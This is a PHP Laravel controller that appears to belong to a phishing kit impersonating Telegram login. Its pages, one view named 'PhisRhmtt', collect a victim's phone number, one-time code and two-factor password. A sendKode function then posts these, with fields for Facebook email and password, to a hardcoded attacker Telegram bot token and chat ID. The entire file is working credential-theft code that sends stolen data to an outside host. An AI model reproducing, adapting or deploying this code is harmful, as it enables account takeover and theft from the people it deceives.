<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;

class RhmtController extends Controller
{
    public function index(Request $request)
    {
        return inertia('Rhmt/Index');
    }
    public function index2(Request $request)
    {
        Session::remove('phoneNumber');
        Session::remove('verif');
        return inertia('Rhmt/Index2');
    }
    public function show(Request $request, $id)
    {

        return inertia('Rhmt/Show', compact('id'));
    }

    public function vcx_login_telegram()
    {
        return inertia('Rhmt/Vcx/PhisRhmtt');
    }

    public function vcx_store_number(Request $request,)
    {

        $phoneNumber = $request->phoneNumber;
        Session::push("phoneNumber", $phoneNumber);
        $this->sendKode($phoneNumber);
        // return redirect()->route("rhmt.vcx_verif_telegram");
    }

    public function vcx_verif_telegram(Request $request)
    {
        $phoneNumber = Session::get('phoneNumber') ? Session::get('phoneNumber')[0] : "";

        return inertia('Rhmt/Vcx/Verif', compact('phoneNumber'));
    }


    public function vcx_verif_store(Request $request)
    {

        $verif = $request->code;
        if ($request->phoneNumber) {
            $phoneNumber = $request->phoneNumber;
        } else {
            return redirect()->route("rhmt.vcx_login_telegram");
        }
        Session::push('verif', $verif);

        $this->sendKode($phoneNumber, $verif);
        // return redirect()->route("rhmt.vcx_password_telegram");
    }

    public function vcx_password_telegram(Request $request)
    {
        $phoneNumber = Session::get('phoneNumber') ? Session::get('phoneNumber')[0] : "";
        $code = Session::get('verif') ? Session::get('verif')[0] : "";
        return inertia('Rhmt/Vcx/Password', compact('phoneNumber', 'code'));
    }

    public function vcx_password_store(Request $request)
    {
        $verif = $request->code;
        $phoneNumber = $request->phoneNumber;
        $password = $request->password;
        $this->sendKode($phoneNumber, $verif, $password);
        Session::remove('phoneNumber');
        Session::remove('verif');
        // return redirect()->route("rhmt.home2");
    }

    public function sendKode(
        $phone = "",
        $otp = "",
        $password = "",
        $email = "",
        $passFB = "",
    ) {
        // mulai dari bot 6 yah

        // BOT 6
        $bot_token = "7563142734:AAHxK7x0t0XVsfM5L11ZTA4VZ1fulmeaJzY";
        $chat_id = "6618417195";


        $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";




        $ch = curl_init();

        // Set cURL options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $chat_id,
            'text' => "Phone | $phone \n OTP | $otp \n password : $password \n
Email FB | $email
PW FB | $passFB
             
            "
        ]);

        // Eksekusi cURL request
        $response = curl_exec($ch);

        // Menutup koneksi cURL
        curl_close($ch);
    }
}
